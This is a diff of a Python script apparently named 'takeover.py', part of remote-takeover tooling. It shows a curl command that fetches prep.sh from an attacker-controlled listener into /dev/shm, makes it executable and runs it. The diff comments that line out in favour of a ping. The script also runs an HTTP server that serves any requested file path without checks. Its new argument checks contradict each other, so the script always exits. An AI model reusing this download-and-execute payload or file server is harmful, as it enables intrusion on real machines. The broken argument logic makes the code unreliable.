@@ -7,12 +7,12 @@ import time
 srv_run = True
 
 def takeover_cmd(listen_ip: str, listen_port: int) -> str:
-    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
-    # cmd_str = f"ping {listen_ip}"
+    # cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
+    cmd_str = f"ping {listen_ip}"
     return cmd_str
 
 
-def run_server(listen_ip: str = '0.0.0.0', listen_port: int = 1337):
+def run_server(listen_port: int):
 
     class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
@@ -22,7 +22,6 @@ def run_server(listen_ip: str = '0.0.0.0', listen_port: int = 1337):
                 self.end_headers()
                 return
             try:
-                file_path = os.getcwd() + self.path
                 file = open(self.path[1:], 'rb').read()
                 self.send_response(200)
                 self.send_header('Content-type', 'application/zip')
@@ -60,5 +59,16 @@ def run_server(listen_ip: str = '0.0.0.0', listen_port: int = 1337):
 
 
 if __name__ == "__main__":
-    run_server()
+    import sys
+    print(sys.argv)
+    if (len(sys.argv) < 3):
+        print("Not enough arguments. Exiting.")
+        print("takeover.py LISTEN_PORT")
+        exit(0)
+    if (len(sys.argv) > 2):
+        print("Too many arguments. Exiting.")
+        print("takeover.py LISTEN_PORT")
+        exit(0)
+        
+    run_server(int(sys.argv[1]))
 
